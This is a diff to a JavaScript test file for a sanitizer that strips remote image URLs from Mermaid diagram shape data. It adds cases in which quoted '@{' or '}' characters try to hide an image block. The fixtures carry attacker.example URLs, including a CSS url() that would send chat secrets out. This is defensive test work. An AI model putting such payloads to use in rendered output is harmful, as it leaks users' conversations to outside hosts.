@@ -76,6 +76,20 @@ test("the remote image key is dropped and the rest of the node kept", () => {
   );
 });
 
+test("a `@{` or `}` inside a quoted label does not hide a later shape data block", () => {
+  const img = 'img: "https://attacker.example/label", w: 10, h: 10';
+  for (const [source, kept] of [
+    [`flowchart LR\n  A["@{"] --> B@{ ${img} }`, 'flowchart LR\n  A["@{"] --> B@{ "w":10,"h":10 }'],
+    [`flowchart LR\n  A["x @{ y"] --> C["}"] --> B@{ ${img} }`, 'flowchart LR\n  A["x @{ y"] --> C["}"] --> B@{ "w":10,"h":10 }'],
+    // An unterminated block is still vetted rather than passed through.
+    [`flowchart LR\n  B@{ ${img}`, 'flowchart LR\n  B@{ "w":10,"h":10 }'],
+  ]) {
+    const out = stripRemoteDiagramImages(source);
+    assert.equal(out, kept);
+    assert.equal(stripRemoteDiagramImages(out), out);
+  }
+});
+
 test("a style statement after a semicolon cannot fetch either", () => {
   const url = "url(https://attacker.example/collect?chat=secret)";
   for (const [source, kept] of [
